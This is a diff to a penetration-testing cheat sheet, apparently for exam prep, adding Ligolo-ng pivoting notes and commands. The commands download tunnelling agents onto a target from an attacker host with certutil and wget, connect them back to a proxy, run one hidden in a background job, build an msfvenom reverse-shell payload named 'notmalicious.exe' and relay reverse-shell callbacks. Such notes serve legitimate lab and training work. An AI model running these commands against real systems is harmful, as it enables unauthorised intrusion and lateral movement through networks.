@@ -6,6 +6,7 @@
 ^Ligolo notes:In the AD set, you WILL need to pivot. The DC is not directly accessible.
 ^Ligolo notes:Ligolo-ng is the modern standard. Master it before the exam.
 ^Ligolo notes:After agent connects, add routes for the internal network. Then treat targets as local.
+^Ligolo notes:Use TCP connect scans through Ligolo, and prefer --unprivileged/-sT when scanning routed internal targets.
 ^SSH notes:Local port forwarding forwards local port to remote service (-L)
 ^SSH notes:Remote port forwarding exposes local service on remote server (-R)
 ^SSH notes:Dynamic port forwarding creates SOCKS proxy (-D)
@@ -42,18 +43,26 @@ Network Discovery:ipconfig /all # Windows: show all interfaces; target-machine
 Network Discovery:route print # Windows: show routing table; target-machine
 Network Discovery:arp -a # Show ARP cache to find other live hosts; target-machine
 Ligolo:sudo ip tuntap add user kali mode tun ligolo && sudo ip link set ligolo up # Create TUN interface for Ligolo; kali-machine
+Ligolo:interface_create --name <interface> #create named Ligolo TUN interface in modern Ligolo console; kali-machine
 Ligolo:sudo ip link set ligolo mtu 1360 # Set MTU to avoid fragmentation issues; kali-machine
 Ligolo:cd /home/kali/Tools && sudo ligolo-proxy -selfcert # Start Ligolo proxy with self-signed cert; kali-machine
+Ligolo:cd /home/kali/Tools && sudo ./ligolo-proxy -selfcert -laddr 0.0.0.0:11601 #start Ligolo proxy listener with self-signed certificate on Kali; kali-machine
 Ligolo:./ligolo-proxy -autocert # Auto-generate certificate; kali-machine
+Ligolo:certificate_fingerprint #display Ligolo certificate fingerprint for safer agent connection without ignore-cert; kali-machine
 Ligolo:certutil -f -urlcache -split http://<kali>:80/agent.exe # Download Windows agent; target-machine
 Ligolo:wget http://<kali>:80/agent && chmod +x agent # Download Linux agent; target-machine
 Ligolo:.\agent.exe -connect <kali>:11601 -ignore-cert # Connect Windows agent to proxy; target-machine
+Ligolo:.\agent.exe -connect <kali>:11601 -accept-fingerprint <hash> #connect Windows Ligolo agent to proxy using expected certificate fingerprint; target-machine
+Ligolo:Start-Job -ScriptBlock { C:\Windows\Temp\agent.exe -connect <kali>:11601 -ignore-cert } #run Ligolo agent in background from PowerShell when you need the shell back; target-machine
 Ligolo:./agent -connect <kali>:11601 -ignore-cert # Connect Linux agent to proxy; target-machine
 Ligolo:session # Select agent session in Ligolo console; kali-machine
 Ligolo:session 1 # Select specific session by number; kali-machine
 Ligolo:tunnel_start # Start tunnel for selected session; kali-machine
+Ligolo:tunnel_start --tun <interface> #start Ligolo tunnel using specified named interface; kali-machine
 Ligolo:msfvenom -p <payload> LHOST=<kali> LPORT=1234 -f exe -o notmalicious.exe #generate reverse shell payload executable to be used with Ligolo pivoting for callback into attacker machine; kali-machine
-Ligolo:listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:<kaliPort> # Add reverse listener; kali-machine
+Ligolo:listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:<kaliPort> # relay reverse shell callback from internal host through selected Ligolo pivot session; kali-machine
+Ligolo:listener_add --addr 0.0.0.0:<port> --to 127.0.0.1:<port> --tcp # relay reverse shell callback from internal host through selected Ligolo pivot session; kali-machine
+Ligolo:interface_add_route --name <interface> --route <target> #add internal subnet route to named Ligolo interface; kali-machine
 Ligolo:sudo ip route add 172.16.1.0/24 dev ligolo # Add route for target network; kali-machine
 Ligolo:sudo ip route add 10.10.0.0/16 dev ligolo # Add route for another network; kali-machine
 Ligolo:sudo ip route add 240.0.0.1/32 dev ligolo # Add route for target localhost access; kali-machine
